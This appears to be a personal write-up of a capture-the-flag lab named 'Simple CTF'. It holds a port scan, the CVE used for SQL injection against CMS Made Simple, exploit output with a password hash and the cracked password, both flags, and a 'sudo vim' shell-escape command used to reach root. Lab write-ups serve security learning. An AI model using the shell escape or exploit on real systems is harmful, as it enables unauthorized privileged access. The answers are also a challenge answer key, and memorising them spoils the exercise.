# Simple CTF

## Notes
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

## Questions
1. How many services are running under port 1000?
```
2
```

2. What is running on the higher port?
```
ssh
```

3. What's the CVE you're using against the application?
```
dirsearch /simple
CMS made simple 2.2.8 CVEs
CVE-2019-9053
```

4. To what kind of vulnerability is the application vulnerable?
```
sqli
```

5. What's the password?
```
exploit result
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: 8
username supposed to be mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

secret
```

6. Where can you login with the details obtained?
```
ssh
```

7. What's the user flag?
```
G00d j0b, keep up!
```

8. Is there any other user in the home directory? What's its name?
```
sunbath
```

9. What can you leverage to spawn a privileged shell?
```
vim
```

10. What's the root flag?
```
sudo vim -c ':!/bin/sh'
cat /root/root.txt

W3ll d0n3. You made it!
```